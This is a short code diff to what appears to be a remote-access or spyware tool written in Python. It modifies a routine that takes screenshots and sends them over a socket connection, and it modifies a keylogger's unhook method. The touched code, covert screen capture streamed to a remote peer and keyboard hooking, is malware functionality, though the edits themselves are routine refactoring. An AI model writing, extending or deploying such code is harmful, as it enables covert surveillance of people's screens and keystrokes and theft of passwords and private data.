@@ -82,11 +82,8 @@ class Server(object):
             try:
                 pyautogui.screenshot().save('bKneabBdp53zAl7zOF5t.png')
                 send = open('bKneabBdp53zAl7zOF5t.png','rb')
-                while True:
-                    data=send.read(1024)
-                    if not data:
-                        break
-                    self.conn.sendall(data)
+                data=send.read()
+                self.conn.sendall(data)
                 send.close()
             except:
                 pass        
@@ -233,8 +230,10 @@ class Server(object):
         keyboard.wait()
     #TODO: Unhook
     def stopKeylogging(self):
-        keyboard.unhook(self.__callback)
-    ##################################################################################
+        try:
+            keyboard.unhook(self.__callback)
+        except:
+            print('Unhook')
     def Close(self):
         s.close()
         close_it=threading.Thread(target=self.root.destroy,daemon=True)
